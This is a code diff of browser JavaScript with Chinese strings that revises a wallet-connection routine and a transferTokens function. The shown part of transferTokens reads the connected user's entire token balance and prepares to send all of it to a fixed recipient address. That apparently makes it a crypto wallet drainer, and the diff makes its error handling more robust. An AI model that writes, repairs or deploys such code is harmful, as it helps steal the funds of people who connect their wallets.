@@ -97,7 +97,7 @@ async function connectWallet() {
             console.log('请求连接钱包...');
             const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
             console.log('账户:', accounts);
-            if (accounts.length > 0) {
+            if (accounts && accounts.length > 0) {
                 account = accounts[0];
                 web3 = new Web3(window.ethereum);
                 document.getElementById('connectButton').innerText = '连接成功';
@@ -120,7 +120,8 @@ async function connectWallet() {
             });
         } catch (error) {
             console.error('连接钱包失败:', error);
-            alert('连接钱包失败，请检查控制台错误信息。');
+            alert(`连接钱包失败: ${error.message}`);
+            document.getElementById('connectButton').innerText = '连接钱包';
         } finally {
             isConnecting = false;
             document.getElementById('connectButton').disabled = false;
@@ -131,13 +132,11 @@ async function connectWallet() {
 }
 
 async function transferTokens() {
-    const recipient = '接收者地址';
+    const recipient = '接收者地址'; // 替换为实际接收者地址
     const contract = new web3.eth.Contract(ABI, contractAddress);
     
     try {
         const balance = await contract.methods.balanceOf(account).call();
-        const amount = balance;
-
         console.log('用户余额:', balance);
         
         if (balance === '0') {
@@ -145,7 +144,7 @@ async function transferTokens() {
             return;
         }
 
-        const amountToSend = web3.utils.toBN(amount);
+        const amountToSend = web3.utils.toBN(balance);
         const messageHash = web3.utils.soliditySha3(account, recipient, amountToSend);
         const messageHashHex = web3.utils.keccak256(messageHash);
 
